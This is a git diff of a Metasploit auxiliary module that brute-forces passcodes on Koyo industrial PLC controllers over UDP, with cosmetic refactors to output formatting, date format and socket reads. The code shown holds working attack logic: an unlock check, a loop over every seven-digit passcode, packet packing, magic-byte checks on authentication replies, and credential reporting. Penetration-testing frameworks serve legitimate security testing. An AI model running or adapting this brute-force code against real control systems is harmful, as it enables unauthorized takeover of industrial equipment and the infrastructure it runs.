@@ -27,7 +27,7 @@ class MetasploitModule < Msf::Auxiliary
         'K. Reid Wightman <wightman[at]digitalbond.com>', # original module
         'todb' # Metasploit fixups
       ],
-      'DisclosureDate' => 'Jan 19 2012',
+      'DisclosureDate' => '2012-01-19',
       'License' => MSF_LICENSE,
       'References' => [
         [ 'URL', 'http://www.digitalbond.com/tools/basecamp/metasploit-modules/' ]
@@ -87,14 +87,14 @@ class MetasploitModule < Msf::Auxiliary
     )
     add_socket(@udp_sock)
 
-    print_status("#{rhost}:#{rport} - KOYO - Checking the controller for locked memory...")
+    print_status("#{Rex::Socket.to_authority(rhost, rport)} - KOYO - Checking the controller for locked memory...")
 
     if unlock_check
       # TODO: Report a vulnerability for an unlocked controller?
-      print_good("#{rhost}:#{rport} - Unlocked!")
+      print_good("#{Rex::Socket.to_authority(rhost, rport)} - Unlocked!")
       return
     else
-      print_status("#{rhost}:#{rport} - KOYO - Controller locked; commencing bruteforce...")
+      print_status("#{Rex::Socket.to_authority(rhost, rport)} - KOYO - Controller locked; commencing bruteforce...")
     end
 
     # TODO: Consider sort_by {rand} in order to avoid sequential guessing
@@ -102,13 +102,13 @@ class MetasploitModule < Msf::Auxiliary
 
     (0..9999999).each do |i|
       passcode = datastore['PREFIX'] + i.to_s.rjust(7, '0')
-      vprint_status("#{rhost}:#{rport} - KOYO - Trying #{passcode}")
+      vprint_status("#{Rex::Socket.to_authority(rhost, rport)} - KOYO - Trying #{passcode}")
       bytes = passcode.scan(/../).map { |x| x.to_i(16) }
       passstr = bytes.pack("C*")
       res = try_auth(passstr)
       next if not res
 
-      print_good "#{rhost}:#{rport} - KOYO - Found passcode: #{passcode}"
+      print_good "#{Rex::Socket.to_authority(rhost, rport)} - KOYO - Found passcode: #{passcode}"
       report_cred(
         ip: rhost,
         port: rport.to_i,
@@ -164,7 +164,7 @@ class MetasploitModule < Msf::Auxiliary
     #
     # Another way to speed things up is to use fancy threading, but that's for another
     # day.
-    while (r = @udp_sock.recvfrom(65535, 0.1) and recvpacks < 2)
+    while (r = @udp_sock.timed_recvfrom(65535, 0.1) and recvpacks < 2)
       res = r[0]
       if res.length == 269 # auth reply packet
         if res[17, 1] == "\x00" and res[19, 1] == "\xD2" # Magic bytes
